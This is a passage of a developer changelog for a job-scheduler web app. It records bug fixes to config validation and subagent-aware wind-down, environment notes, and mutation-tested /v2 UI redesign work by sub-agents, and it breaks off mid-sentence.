Three unattended scheduler runs diagnosed and wrote this fix and could not land it: `.scheduler.json`
had `permMode: "acceptEdits"`, which grants Edit/Write but no Bash, so `npm test`/`bd`/`git commit` were
all denied, and `reap()` force-removes the worktree in a `finally` regardless of outcome. The complete,
reviewed fix survived only in memory (`handoff-5x7-config-validator-fix.md`) across two of those runs.
Landed now that `.scheduler.json` declares `permMode: "auto"`.

**The bug:** `parseProjectConfig` returned a verdict *and* a silently-normalised config
(`permMode: "yolo"` → `"default"`, a rejected `budget` → `null`). Every caller persisted the
normalised `config` and re-derived validity by re-parsing *that stored copy* — `pollProject`,
`decorateProject`'s `configErrors`, and `GET /:id/ready`'s `!autoLabel` branch — which came back clean
because the rejected value was already gone. Net effect: a repo declaring `permMode: "yolo"` was
accepted, showed no config error, was offered for activation as sound, and ran under `default`
permissions it never validly asked for. Worst case: `minHeadroomPct: "50%"` dropped the whole `budget`
block silently, running with **no** self-restriction — the opposite of what the repo asked for.

**The fix:** a rejected config now carries its own reasons under `_rejected` (`rejectedConfig()`,
`lib/projects.js`), so `parseProjectConfig(normalise(x))` re-validates rejected exactly like
`parseProjectConfig(x)` — carried-first, exact-string de-duped, so storing the same rejection twice
neither accumulates nor loses reasons. `discover()` and `POST /api/projects` now store `rejectedConfig(errors)`
instead of `{}` when the file isn't parseable at all (`{}` used to re-validate to exactly one error,
"must set autoLabel" — a trailing comma surfaced on the tab as a missing label). `GET /:id/ready` now
branches on `!parsed.ok`, not just a missing `autoLabel` — the old branch still returned the bead list
alongside the reason.

**Verified:** 401/401 (`npm test`). Mutation-checked three ways, each confirmed to fail without its
fix: reverting the carried/`all` merge fails the round-trip and laundered-permMode poll tests; reverting
the `/ready` `!parsed.ok` branch hands back the bead list again; reverting `rejectedConfig` in
`POST /api/projects` reports "must set autoLabel" for a malformed file instead of the real JSON error.

**Left for follow-up, not fixed here (from the handoff, still true by reading):** `parseProjectConfig`
rejects only `autoLabel`/`permMode`/`budget` — every other field (`model`, `timeoutMin`, `cwd`,
`enabled`, `maxConcurrent`, unknown keys under `defaults`) is coerced silently, several with a live
"bead retried forever" failure mode. Worth their own beads if this surface gets more attention; not
filed yet.

## ✅ Fixed 2026-07-26 — wind-down was not graceful for a run with subagents

- [x] **FIXED and verified end-to-end.** Bead `claude-scheduler-k9p`.

User report: "wind down isn't working properly — it forces the agent to stop. Tried it on a
previously running session and it immediately stopped its background agents without a safe
stop." **Disambiguated first, as this section previously insisted: confirmed to be LaunchBox's
⤓ button, not Claude Code's own wind-down.**

### Root cause, measured rather than assumed

The previous hypothesis was right, and is now measured. A real `claude -p` with two Task
subagents mid-generation, sent one SIGINT:

| | uninterrupted | SIGINT during fan-out |
| --- | --- | --- |
| time to exit | 158s (ran to completion) | **985ms after the signal** |
| `result` event | `success`, `is_error: false` | **`error_during_execution`, `is_error: true`** |
| exit code | 0 | 0 |
| subagent transcripts | 27.2KB / 25.9KB, ending in the answer | frozen ~18KB, **`[Request interrupted by user]`** |

So a single SIGINT abandons in-flight fan-out in under a second. A subagent's work is not a
tool call the parent can decline on its way out; it is work already in progress, and it is
discarded. The stop ladder was never the culprit — `requestStop()` simply sent rung 1 with no
knowledge of fan-out, while its own log line promised "winding down at the next safe point".
For fan-out there is no such point, so **waiting for it to finish IS the safe point.**

Note the `error_during_execution` result was already handled correctly (`lib/runner.js`, the
comment above `child.on('close')`) — the run is recorded `stopped`, not `fail`. That part of
the M3 spike held up.

### The fix

`requestStop()` now holds rung 1 while the run has subagents in flight, bounded by
`subagentHoldMs` (default 300s) so a wedged subagent cannot make a stop unstoppable. The
soft-grace ladder is armed **by the SIGINT, not by the request**, or a long hold would eat the
grace the child was promised. A hard `kill` still overtakes the hold immediately.

### ⚠️ The direction this section used to recommend was WRONG — mtime is not the signal

The previous plan here was to reuse `lib/sessions.js`'s mtime watch over
`<sessionUuid>/subagents/agent-*.jsonl`: "no subagent transcript touched inside the liveness
window". **That was implemented, verified live, and failed** — the fix looked correct and was
not:

**A subagent transcript is written at START — ~18KB of prompt plus attachments — and then
nothing is appended until it FINISHES**, when the answer lands in one go. A subagent that is
thinking therefore looks *idle* on disk. A 15s mtime window reported "fan-out settled after
16s" while both subagents were still generating, and the SIGINT killed them exactly as before.
The tell was the transcripts growing by only ~565B — which is the size of the interruption
record, not of an answer.

`liveSubagentCount` is therefore **content-based**, and the record shapes are measured:

| last record in the transcript | meaning |
| --- | --- |
| `assistant` with terminal text | finished — that is the answer |
| `assistant` with `text` *and* `tool_use` | still working, waiting on a tool |
| `user` with `tool_result` | still working |
| the prompt, or an `attachment` | still working, has not begun answering |
| `user` = `[Request interrupted by user]` | already aborted; nothing to wait for |

mtime survives only as a staleness bound (`DEFAULT_SUBAGENT_STALE_MS`, 10min): a crashed run
leaves transcripts mid-conversation forever, and without it every later stop in that session
would wait out the full hold cap.

Also measured, and the reason the probe is keyed on the session id across all project dirs
rather than on a slug built from the run's cwd: **Claude slugs the *resolved* cwd**, so a run
under `/var/...` lands in `-private-var-...`. The first probe of this bug derived the slug from
the unresolved path, watched a directory that never appeared, and reported a clean stop.

### Verification

- 386/386 tests, stable across 3 consecutive full runs.
- 6 ladder invariants and 5 probe invariants mutation-checked. **Four of them were decorative
  when first written and were rewritten until they failed**: two ladder tests passed because the
  fake fan-out never settled or because the fake child exited on SIGTERM before the guard was
  reached; the `tool_use` test used a pure `tool_use` block, which the terminal-text test
  already rejects, so it could not see the guard; and the truncated-line test put only a prompt
  behind the partial line, giving the same answer either way.
- **Live, on the real path** — real `claude -p`, real subagents, real probe, no injection:
  held with 2 in flight, released after 40s, transcripts grew 18KB → 28KB ending in 6019- and
  6185-character answers, `[Request interrupted by user]` absent, SIGINT the only signal, run
  `stopped` with the session resumable.

### One thing to watch

The hold makes a wind-down take as long as the fan-out does — up to 300s by default. That is
the intended trade (the button promises graceful), but if a soft pause ever needs to drain fast,
`subagentHoldMs` is the lever, and `kill` still stops immediately.

Do NOT reach for the stdin control channel here: M3 measured `interrupt` as behaviourally
identical to SIGINT, so it buys nothing.

## Environment notes

- **`better-sqlite3` and macOS Gatekeeper.** The downloaded prebuilt `.node` gets flagged by XProtect and removed — symptom is `ERR_DLOPEN_FAILED: library load disallowed by system policy`, or an empty `node_modules/better-sqlite3/build/Release/`, plus "unsafe software" popups. Fix: `npm rebuild better-sqlite3 --build-from-source`. A locally compiled binary is ad-hoc linker-signed with no `com.apple.quarantine` xattr, so Gatekeeper leaves it alone. Node 26 is also newer than the shipped prebuild ABI. M6 tracks migrating to built-in `node:sqlite` (verified available on this Node) to remove the native dep entirely.
- Dev server: `CS_DATA=$(mktemp -d) CS_PORT=18741 node server.js`. Tests: `npm test` (sandboxed `CS_DATA`, fake spawns).
- A flake was **introduced and removed on 2026-07-26** while adding the subagent-hold tests, and
  it is worth knowing the shape: asserting `windowMs: 0` counts nothing is racy, because the
  cutoff is then exactly `now()` and a file written in the same millisecond satisfies
  `mtimeMs >= cutoff` legitimately. It failed 1 run in 4. Fixed by moving the injected clock
  instead of squeezing the window to zero. This is the same load-sensitive class as the item
  below, and evidence that this class is easy to write here.
- **✅ Identified 2026-07-31 (bead `0p5`): the intermittent failure is `tests/scheduler.test.js:162` — "afterReset alongside a once-entry: the spent once must not disable the job".** Caught on run 1 of a 40-run soak executed while the machine was under real load (a subagent, a CDP browser session and the daemon all running) — confirming the load-sensitivity suspicion recorded here on 2026-07-25, when it appeared alongside Chrome and two dev servers and then hid for 10 idle runs. Failure mode: `starts.length` is `0` not `1` at `:172` — the `once` entry gets 150ms of lead and a fixed 400ms window, and under load the scheduler tick slips past it, so the fire never happens inside the sleep. Full output: the soak kept the failing log. Fix filed as its own bead (poll-until-deadline instead of fixed sleeps); the same fixed-sleep pattern in the surrounding afterReset tests (e.g. `:152`, `:157`, `:183`) is worth sweeping in the same pass.
- Usage probe (ground truth, ~2s, $0): `printf '%s\n' '{"type":"control_request","request_id":"1","request":{"subtype":"get_usage"}}' | claude -p --input-format stream-json --output-format stream-json --verbose`

## 2026-08-01 — Full-app redesign mockups under `redesign/` (bead `dby`)

29 static, cross-linked HTML pages redesigning every screen and state, built on the
dense-product-ui system (IBM Plex, closed type scale, one-hue-one-meaning) with a **dark theme
as default** plus a persisted light/dark toggle — the dark layer is token overrides in
`redesign/assets/launchbox.css`, the skill's `system.css` is vendored untouched.

Decisions that need remembering:

- **IA is Overview + 5 tabs (History renamed Runs), chosen provisionally** — the explicit deal
  is that it gets judged by clicking through, not locked. Overview adds a needs-attention feed,
  a next-24h fire list and a daemon-unreachable banner; all render data the daemon already has.
- **Run-state colour system:** red family split by dot *form* (fail solid · timeout ring ·
  killed square); deliberate non-events (skipped/stopped/queued/disabled) are muted with their
  own forms; amber is reserved for degree (bead priority pills, usage past warn, pause
  escalation HOLD→SOFT→HARD); blue = actionable/in-progress.
- Sessions pages are the visual target for the M5 build happening in parallel — mockups only,
  nothing outside `redesign/` touched.

Verification: every page rendered headless in **both themes** (58 captures); 7 dark pages
reviewed by hand, the rest split across two subagent QA passes with a defect checklist —
0 genuine defects, 2 fixes applied along the way (queued-row copy, after-reset jitter field
wrapping as a group). Type-scale audit via grep: all sizes on the closed scale, weights
400/500/600 only, no hex colours in markup.

## 2026-08-01 · Redesign audited, hardened, and turned into the /v2 plan

Neutral UI/UX audit of all 32 `redesign/` pages, driven in real Chromium at 1280×900 in
**both themes** with measured gates (exact WCAG contrast per text node, stranded-surface
detection, overflow, console, links) — the gate lives at `redesign/qa/audit.mjs` and is
green across all 64 views. Verdict: build it; the reason-per-state and consequence-line
patterns are the design's core value and are named as must-preserve in `redesign/REVIEW.md`.

What the gates caught that the earlier eyeball passes did not: **388 raw AA contrast
failures** (all token-level: light `--ink-3` at 2.4:1, links/primary at 4.14, P1 pill at
2.89, dark `--ink-3` at 3.0 on segmented tracks), a **48px horizontal scroll on every page**
from the theme button's `opacity:0` tooltip box, UA-default yellow `<mark>` in the failed-run
log, and unthemed `number`/`time` inputs rendering white in dark. All fixed at the token /
selector layer; palette hue jobs unchanged. The same ten fixes were **backported to the
dense-product-ui skill** (`system.css`, `rules.md` hex mentions, kitchen-sink labels) so
future skill uses start AA-clean; `tripper/trip-planner/design/system.css` is a known old
copy, deliberately left.

Nine review recommendations were adopted by Vignesh and applied to the mockups (pause pages
now say fires are dropped, daemon-down pages disable mutating controls with reasons, explicit
Cancel in committing dialogs, quiet session deletes, focus-visible tooltips + aria-label
exemplar, validation-error anchors, frozen approval form, as-of stamps, 10.5px chips).

Implementation decided and beads filed: **/v2 parallel UI** (old UI and API untouched until
cutover; API policy is additive-only, changed semantics go to `/api/v2/*`), **Sonnet 5
sub-agents** in waves, epic `claude-scheduler-btv` with 15 children and verified `blocks`
edges — `bd ready` offers only A1. Full plan: `redesign/IMPLEMENTATION-PLAN.md`. No
autoLabel on any of it: code beads can't verify their own work unattended.

## 2026-08-01 · /v2 wave 0 begins — A1 shell, and why its four green tests meant nothing

`btv.1` (A1) merged as `b293818`: `/v2` serves the audited shell — `redesign/assets/{system,
launchbox}.css` + `theme.js` copied byte-identical (`cmp`-verified, and kept that way; they are
the AA-clean token layer, not a starting point) — plus an explicit exact-path `GET /v2` route.
That route exists because `serve-static` 301-redirects a slash-less directory request, so a bare
`/v2` could never reach the 200 the bead's acceptance asks for. `/v2` stays deliberately
unauthenticated like the rest of `public/`; only `/api` is token-gated, so the page can load in
order to explain a missing key.

**The lesson of the wave, recorded because it nearly shipped.** The first pass was reported
complete with 4 new tests, 448/448 green, and a mutation table. The first real-browser load was
a white unstyled page: `bodyBg rgba(0,0,0,0)`, `document.styleSheets` empty, `pageerror:
lbToggleTheme is not defined`. The document sat at `/v2` with no trailing slash, so every
document-relative `assets/…` reference resolved against `/` and 404'd. Two of the tests were
individually true and jointly worthless — one asserted the response *body contains* the
stylesheet link, the other fetched `/v2/assets/system.css` directly, which is not the URL a
browser requests from a document at `/v2`. Fixed with root-absolute asset paths (not a redirect,
which the acceptance forbids, and not `<base href>`, which would silently rewrite A2's router
URLs too). The replacement test resolves each `href`/`src` the way a browser does — `new
URL(attr, documentUrl)` — then fetches it and asserts 200 with a real content-type, explicitly
asserting `text/html` is *not* what comes back, since that MIME is the 404-fallthrough's
signature. Generalised to memory as `assert-resolved-subresources-not-markup`.

Three mutations were re-run independently at the merge bar rather than taken on report (route
removed → 301; `/v2` put behind the `/api` gate; asset href back to relative → 404): all three
red, restored green. Browser leg: headless Chromium 1280×900, both themes — zero console errors,
zero failed requests, dark set before first paint, toggle persists across reload,
`scrollWidth === clientWidth` in both themes and on hover (the 48px tooltip overflow stayed
fixed), `[data-tip]:focus-visible` tooltip appears on Tab.

Owner decisions this session: **fonts stay on the Google Fonts CDN link** as the mockups have it
— so type is correct online and silently falls back to the system stack offline, which means the
E1 gate measures fallback metrics if it ever runs without network. Verified the CDN actually
loads and that IBM Plex Mono reads `false` from `document.fonts.check` only because the bare
skeleton renders no mono glyph yet; it resolves to Plex Mono the moment mono content exists.
Second decision: the orchestrator commits per merge bar, sub-agents never commit.

Sequencing note: **C1a (`server.js`) and A2 (`public/v2/`) were dispatched concurrently** — the
plan puts them in different waves, but its actual constraint is file-disjointness and these two
share no file. Verification runs against an isolated instance on **43410** (this project's
allocated QA/sandbox port) started with its own `CS_DATA`; an empty DB is what makes it safe to
run a second scheduler at all, since one sharing the live DB could fire real jobs. The owner's
daemon on 43400 is a foreground `npm start`, not launchd-supervised, so it is never restarted to
test — a second isolated instance is.

## 2026-08-01 · Waves 0 and 1 complete — C1a, A2, and one bead deleted rather than built

`btv.2` (C1a) merged as `0a0001a`, `btv.4` (A2) as `6ba7d30`, `btv.3` (D1a) **closed as
unnecessary**. `/v2` now has a working shell, appbar, router and API client, plus the one
aggregation endpoint the Overview tab needs. Old UI and old API untouched throughout; a test pins
that.

**C1a — `GET /api/v2/overview`.** Additive route, nothing existing changed. It reuses `lib/`
rather than re-deriving: `previewSchedule` for fire times, `policy.explain(job)` for budget
admission, `pause.mode()` for suppression, TTL-cached `bdStatus` so a request never fans out one
`bd` call per row. Two REVIEW recommendations turned out to be *data* requirements, not UI work,
and would have been unimplementable if the payload couldn't carry them: **#1** pause suppression is
per-fire (`admitted` + `blockedBy.mode`), so the Next-24h panel can say "listed, but dropped while
Hold is on" without the UI re-deriving admission and contradicting the daemon; **#8** every
section carries its own `asOf` taken from that data's real source (the usage poll's `checkedAt`, a
project's `lastPollAt`), because one request-time stamp would let a stale card claim it was just
checked. `unknown` is kept distinct from `0` everywhere — a real 0% is legitimate, so absence
needed its own flag rather than a value that renders as a healthy meter.

**The C1a finding: parsing your own prose.** The endpoint decomposes `lib/budget.js`'s reason
sentences with regexes so the UI never parses English — reasonable, except the tests only fed the
decoder *synthetic* strings. Proved the hole by mutating the **dependency** instead of the code
under test: reworded `blockReason`'s reserve sentence and re-ran. 4 tests failed, all in
`tests/budget.test.js`, **0** in the new v2 tests. So drift wasn't perfectly silent, but the tests
that caught it sit nowhere near the regexes and carry no pointer to them — the realistic sequence
is reword, update the budget tests, ship green, and `/v2` silently degrades every skip reason to
`{code:'other'}`, discarding the reason-inline property REVIEW.md calls the design's best feature.
Fixed with coupling tests that drive the real producer through the endpoint, one per branch —
verified by rewording again and watching *only* the matching branch go red — plus pointer comments
at each producer site. Follow-up `claude-scheduler-ddu` filed to return structured reasons and drop
the live-path regexes; deliberately not done here, since reshaping a function on the current UI's
live path is a different risk profile than adding a route.

**A2 — the frozen contract.** `public/v2/README.md` is the artefact eight later beads build
against. The token-vs-route collision was handled explicitly: `#token=` is delivery, not a route;
capture strips only the token and preserves the route hash (the old path wiped the whole hash); and
`captureTokenFromHash()` must run before `mountChrome()`, or a cold `claude-scheduler open` deep
link 401s its own first request — a third variant of that trap nobody had written down.

**The A2 finding: a contract that promised a mechanism it didn't have.** The README stated *"mark
any control with `data-mutating` and it is automatically killed under daemon-unreachable"*. It
wasn't — the only auth-state subscriber re-rendered the appbar. Measured by rendering one
`data-mutating` button exactly as the README instructs and aborting `/api/**`: appbar seg
`disabled:true` with its reason, page control `disabled:false` still offering "Create a new job",
under a banner announcing that requests were failing. REVIEW #2's exact defect, reintroduced at the
contract layer where six wave-2 agents would each have had to work around it. Fixed as one central
sweep subscribed **twice** — `onAuthState` so an open page goes dead, and a new router `onRender`
hook so a route opened *while already degraded* comes up dead. The second is the case a
change-only sweep silently misses, and it has its own test: removing just that subscription turns
exactly one test red. Also exported `degradedReason()` as the single definition of the two reason
strings; the README had been telling every page to retype them, which is how one failure comes to
be worded six ways. Generalised to memory as
`exercise-contract-promises-from-the-consumer-position`.

**D1a — deleted, not built.** The plan specified `POST /api/v2/schedule-preview`. Investigation
found `POST /api/schedule/preview` already does all of it, and `lib/validate.js` states reset
jitter is deterministic in `(jobId, window)` *"so a preview shown in the UI is the time that
actually fires"* — it is already the canonical preview mechanism, and a second one is precisely the
"preview said 11:50, fired 11:47" drift the plan warned about. Verified live across seven cases:
5-field cron → 3 fires; 6-field cron accepted; invalid → 400 carrying Croner's own message;
once-in-past → `{next:[],unknown:false}`; unresolvable afterReset → `{next:[],unknown:true}`;
`{schedules:[a,b]}` → merged and sorted; no token → 401. Note the two empty cases are **different**
and the dialog must distinguish them. Owner approved closing the bead. Bonus find recorded on
`btv.11`: the validation mockup illustrates a cron error as "6 fields — expected 5", but Croner
accepts 5 *or* 6 fields (the 6th is seconds) at both preview and create time — so that inline
message must be rendered from whatever Croner actually rejects, never a hand-authored field count.

Process notes. Sub-agent reports are not evidence: every claimed mutation was re-run
independently at the merge bar, and both rounds of pushback came from measurements the agents' own
green suites had missed. One self-inflicted error worth recording: restoring `lib/budget.js` from a
backup taken *before* an agent added its pointer comments silently reverted them — the fix landed,
the documentation of why didn't. Re-added and re-verified comment-only. Also mis-addressed a
review message to the wrong concurrent agent; it correctly refused to act on another bead's files.
Wave 2 is dispatching in owner-approved batches of two rather than all six at once, because both
A1 and A2 shipped defects that only a careful browser leg caught, and six simultaneous merge bars
is how the next one gets through.

## 2026-08-01 · Wave 2 batch 1 — Jobs and Runs, and a vocabulary already drifting

`btv.5` (B1, Jobs) merged as `4f674a2`, `btv.6` (B2, Runs + log drawer) as `6fdad89`. Dispatched
in an owner-approved batch of two rather than all six of wave 2 at once, on the grounds that both
A1 and A2 had shipped defects only a careful browser leg caught, and six simultaneous merge bars
is how the next one gets through. That decision paid for itself twice over.

**Both beads were verified against seeded, real data — not fixtures.** This was the explicit fix
for A2's honest "UNVERIFIED: populated chrome": each agent stood up its own isolated instance on
its own QA port with a throwaway `CS_DATA` and drove the real API. B2 produced a genuine 70-second
timeout and a real overlap-skip, and killed and stopped live processes through the real endpoints;
B1 created nine jobs and killed/stopped real runs to get true `ok`/`fail`/`killed`/`stopped`/
`disabled`/`running` rows. An empty database exercises neither a jobs table nor a log drawer, and
neither bead would have been trustworthy without this.

**B1's bug is the one worth remembering.** `GET /api/v2/overview` wraps attention as
`{asOf, items}`, not a bare array. B1's jsdom fixtures had been hand-built in the *wrong* shape, so
the unit tests were green while the real page threw `TypeError: object is not iterable` and
rendered **zero rows** beneath a correct row count. Same failure family as A1's asset 404s: a test
that asserts against a shape you invented tells you only that your invention is self-consistent.
Fixed, fixtures corrected, and a regression test now names the real wrapper — mutation-verified by
the orchestrator by reverting to the flat-array read.

**Refusals to fabricate, recorded rather than papered over.** Three mockup strings turned out not
to be derivable from the data model and were replaced with things that are true rather than
invented: `killed` says "stopped immediately" instead of "hard stop was active", because
`lib/runner.js`'s `kill()` stores no reason in `meta` (unlike `requestStop()`'s `stopReason`), so a
manual kill and a hard-pause `killAll` are indistinguishable after the fact; the queued row drops
the trigger-source word, absent from `/api/jobs`'s `lastRun` summary; a `bucket_severity` skip
omits "resumes Wed" for want of a reset time. B2 likewise dropped "retry 2 of 2" (no persisted
attempt count) and an exact "SIGINT sent HH:MM:SS" (no stop-request time is stored). These belong
in the mockups' errata, not in the code as plausible-looking lies.

**The finding that stops batch 2: the run-state vocabulary is duplicated and already drifting.**
B1 and B2 independently wrote the same encoding — per status, a colour class, a dot form and a
label — in `pages/jobs-logic.js` and `pages/runs-format.js`. The dot forms agree, but by luck:
nothing tests that the two tables match. The labels have *already* diverged, with status `fail`
rendering as "failed" on Jobs and "fail" on Runs. `ordinal()` was written twice, and one copy got
the teens wrong (`11st`) — caught only because the sibling agent's concurrent test run happened to
trip over it. Four more pages (Overview, Projects, Sessions) render these same states, so the cost
triples if this waits. Filed as `claude-scheduler-bmn` at P1, blocking `btv.8`/`.9`/`.10`, with
the direction of every `blocks` edge verified after filing rather than inferred. Generalised to
memory as `extract-shared-vocabulary-before-fanning-out`: the shared vocabulary is a wave-0 task,
and if it isn't extracted before the fan-out, every agent correctly writes its own.

Housekeeping. Port 43411 was found occupied by pid 39469 — an isolated instance (temp `CS_DATA`)
from an earlier session, started 16:50, predating this session's agents. B1 identified it, refused
to kill it, and used a different port, which is the right call; it is left running and flagged for
the owner. The orchestrator's own verification instance on 43410 was stopped at wind-down. The
owner's daemon on 43400 was never touched and answers 200.

## 2026-08-02 · bmn — one run-state vocabulary, pinned to the mockups

`claude-scheduler-bmn` is done: `public/v2/state-vocab.js` is now the single definition of
status → {colour class, dot form, label} plus `ordinal()`, and `jobs-logic.js`, `runs.js`,
`runs-log.js` and `jobs.js` all import it with no local copies left. `computeRowState` keeps only
the Jobs-specific part — which state a *job* is in, and the second line of prose; the triple itself
is a lookup. `jobs.js` also stopped building `state__dot--${form}` by hand and calls `dotClass()`.

**The drift resolved against the mockups, not by picking a favourite.** `fail` renders as **fail**,
not "failed". `redesign/runs.html:222` and all three `runs-log-*.html` show the chip as "fail";
`jobs.html` has no failing row at all, so B1's "failed" had nothing behind it. The dot forms were
already identical and stayed byte-identical. Two further divergences surfaced that the bead hadn't
listed: the unknown-status fallback was `muted` on Runs and *unstyled* on Jobs (unified on muted —
an unfamiliar state should read as inert, not as an ordinary healthy row), and only one of the two
`ordinal()` copies guarded non-finite input.

**The test pins the vocabulary to the audited mockups by parsing them.** A golden table retyped in
the test file would only prove the test agrees with itself — the exact failure that let "failed"
ship and the same family as A1's asset 404s and B1's hand-built fixture shape. So
`tests/frontend-v2-state-vocab.test.js` jsdom-parses every `redesign/*.html`, collects each
`.state` chip's (colour, dot modifier, label), and asserts `STATE_VOCAB` matches. Change a label or
a dot form in the module and the mockups contradict you.

**Two versions of the single-source gate were wrong, and only mutation caught them.** The check
that forbids a page re-declaring the table started anchored to the start of a line — a one-line
`{ running: 1, ok: 2, fail: 3, killed: 4 }` sailed straight through. Dropping the anchor and
counting bare status keys then flagged `runs.js`'s own toolbar counter
`{ all, active, ok, fail, stopped, skipped }`, which shares four names with the status set but maps
them to integers. The rule that works requires the *value* to look like rendering — a colour
family, a dot class, a `{cls,dot,label}` record, or a bare string. That last clause matters and was
also added only after mutation: a pure label copy `{ running: 'running', fail: 'failed' }` passed
the colour-only version, and a label is the thing that actually drifted. The 3-key threshold is a
documented limit, verified rather than assumed — a two-status snippet still slips through.

Eight mutations run in total, each reverted: three fake table copies (multi-line, one-line,
label-only), a hard-coded `state__dot--ring`, a second `ordinal()`, `fail`→"failed",
`killed` square→ring, `timeout` bad→warn, a broken teens branch, and a re-introduction of the
original defect (Jobs overriding the label locally) — which turns exactly the Jobs-vs-Runs
agreement test red. 527/527 green.

**Browser leg.** Isolated instance on 43410 (the allocated QA slot) with a throwaway `CS_DATA`,
seeded through `lib/db.js` with one job and one run per status plus a disabled job, then driven
over CDP across Jobs and Runs in **both** themes. Read back not just the class lists but the
*computed* dot background and border-radius per theme, since a class present but unstyled is a
regression a class list alone would not show. Every shared status agrees on both pages in both
themes: fail `bad|—`, timeout `bad|ring`, killed `bad|square` (radius 1.5px), stopped
`muted|square`, skipped `muted|—`, ok `ok|—`, and Jobs-only disabled `muted|solid`. Zero console
errors; the one 404 is `/favicon.ico`, which the *existing* UI 404s too — pre-existing, not a bmn
regression, filed at P4. Instance stopped at wind-down; the owner's daemon on 43400 was never
touched and answers 200.

**The same defect, one vocabulary over — filed before it happens.** Parsing the mockups for this
work surfaced a *second*, disjoint state family that bmn deliberately did not fold in: "active",
"pending", "bd busy", "paused", "handed back", "stopping…" — project/bead/lease states, rendered
across the pages owned by btv.8, btv.9 and btv.10. Three agents would each encode it independently,
which is precisely how the run-state table came to be written twice. Filed as
`claude-scheduler-1ys` at P1 and blocking all three, the same shape of edge bmn had, with the
direction read back after filing rather than inferred. Note for the owner: those three edges are
mine, not the plan's — drop them if C1 should absorb the work instead.

Housekeeping. Port 43411 is *still* occupied by pid 39469, the isolated instance from the earlier
session flagged in the last entry. Not this session's, not killed, still flagged.

## 2026-08-02 · 1ys — the project vocabulary, and a chip that isn't a function of `state`

`claude-scheduler-1ys` done. `public/v2/state-vocab.js` now also carries `PROJECT_VOCAB` +
`projectStateMeta()`, and the run family gained a derived `stopping` entry with `runStateKey()`.

**The structural finding, and the reason this is a function rather than a second lookup table:
the project chip is not a pure function of `state`.** A project row carries `state` ∈
`pending|active|paused|error` (`lib/db.js`'s `PROJECT_STATES`) and, orthogonally, a `busyStreak`
counter (`server.js`'s `decorateProject`, overview's `automation.projects[]`); burst membership
isn't on the project at all but on the burst payload's `projectIds`. The mockups draw **one** chip,
so something has to decide which of the three wins — and if that isn't decided here, C1, C2 and C3
each decide separately, which is the same defect one level up from the one bmn just fixed. Encoded
as **bd busy > burst > state**, with the reasoning written down: a project whose bead graph can't
be read makes every other claim on the row (ready counts, burst progress) stale, so masking a warn
behind an info would be a lie of omission. No mockup shows a project that is both, so that
precedence is flagged in the source as a decision rather than a transcription.

**Two mockup strings resolved the honest way.** `error` is a real member of `PROJECT_STATES` that
**no mockup ever draws** — encoded as `bad`/"error" rather than left to the muted fallback (a
project that cannot be polled is a failure, not an inert row), and it is the single entry in the
file with no mockup behind it. Rather than let that be a silent gap, the test carries an explicit
`UNAUDITED_PROJECT_KEYS` list and fails if anything *else* joins it. Conversely `handed back`
(`project-detail.html`) is **UNMAPPABLE and was not encoded**: `lib/projects.js:749` emits
`handed-back` and the `onDone` path emits `closed:false`, but `server.js:1826-1828` only
`console.log`s it — `rowToRun` exposes just the raw status column and no endpoint distinguishes
closed from handed back. Same call B1/B2 made on "hard stop was active" and "retry 2 of 2". Filed
as a follow-up to give the outcome somewhere durable to live.

**A fourth wording was already forming for the wind-down.** Tracing "stopping…" showed it is a
*run* concept, not a project one (`lib/runner.js`'s `stopping()`, per-run `meta.stopRung`) — and it
was already being said three ways before the page that needs it exists: `runs.js:63` rendered
"· winding down", `runs-log.js:91` rendered "· stopping…", and `pause-soft.html` draws a chip
reading "stopping…". The mockup wins; all three now read `STATE_VOCAB.stopping.label`, and a test
fails on either string being retyped in a page. The drawer's *banner* still opens "Winding down." —
checked against `runs-log-winding-down.html`, which is where that sentence comes from; it explains
what the signal did rather than naming the state, so it was deliberately left alone.

**B2's own test caught the change, which is the system working.** `tests/v2-runs.test.js` asserted
the row said "winding down" — a green test pinning a wording that already contradicted the drawer
sitting next to it. Updated to assert `STATE_VOCAB.stopping.label` rather than a retyped string, so
it can't re-drift.

Nine mutations run and reverted: project `paused` square→ring, "bd busy"→"beads busy", `error`
dropped from the table, precedence flipped to burst-first, `busyStreak > 0` weakened to `>= 0`,
`PROJECT_STATES` grown a member the vocabulary lacks (caught, because the test imports the enum
from `lib/db.js` instead of retyping it), `runs.js` retyping "winding down", `runStateKey` no longer
deriving `stopping`, and the `stopping` label drifting off the mockup. Each turned the intended
test red. One gate needed narrowing first: the retyped-wording scan flagged its own explanatory
comment and `STOP_RUNG_TEXT`'s SIGINT sentence, so it now strips comments and targets the label.
533/533 green.

**Browser leg.** Same isolated instance on 43410, with a live winding-down run seeded *after*
startup — seeding it before would have been reaped by `failOrphanRuns`, which is how the earlier
`queued` fixture quietly became a `fail`. The list row reads `scheduled fire · d1f9…fa · stopping…`
and the drawer chip reads `running · stopping…`; before this change those two said different
things. Only console 404 is the already-filed favicon. Instance stopped; 43400 answers 200.

The project chips themselves are **UNVERIFIED in a browser** — Projects, Overview and Sessions are
still `renderPlaceholder` stubs, so there is nothing yet that renders them. That verification
belongs to btv.8/.9/.10, which is the point of extracting the vocabulary before they start.

## 2026-08-02 · btv.8 (C1 Overview) + btv.7 (B3 Settings) — and two refusals that didn't propagate

Both built by Sonnet sub-agents in parallel on disjoint files, both re-verified at the merge bar.
`btv.7` shipped as `3f633f3`. Between them the merge bar found six defects that the agents' own
green suites did not, which is now six waves in a row.

**B3's three.** (i) The degraded-sweep test covered the *Uninstall* button only; removing
`degradedReason()` from the **Cleanup** button's compound disable failed no test, leaving "Wipe
everything" clickable against an unreachable daemon. Replaced with a table-driven test over all
three gated controls — cover the guarantee, not one instance of it. (ii) The fail-OPEN approval
notice had no test at all, because the build host is macOS with the helper merely *uninstalled*,
which is the fail-CLOSED path and never renders it; `lib/approval.js` draws a sharp line the UI
must not blur — non-darwin returns `degraded:true` and gated actions **run without an approval**,
while a missing helper returns `degraded:false` and they are **refused**. Now tested both ways.
(iii) A route opened while *already* degraded rendered an **empty** `#v2-page` — a blank rectangle
under the global banner. A2's finding, one page over. Now an explicit unreachable state that names
the request it tried and offers Try again, and deliberately renders no editable form, because a
form of blanks invites saving those blanks over real settings; CDP-verified that Try again
recovers to the full 16-row form. `runs.js` has the same first-load shape and is already merged —
filed rather than widened into the bead.

**C1's three, and they share one root cause: a refusal recorded in one page's comments does not
propagate.**

*"failed" was never actually fixed.* `bmn` resolved that status to "fail" against the mockups —
but the **"Today so far" strip on `runs.js` had carried its own `[['fail','failed'], …]` tuple list
since B2**, and C1 copied it into `overview-logic.js`. It survived the consolidation because
`bmn`'s single-source check looks for *keyed tables*, and a tuple array is not one. So the exact
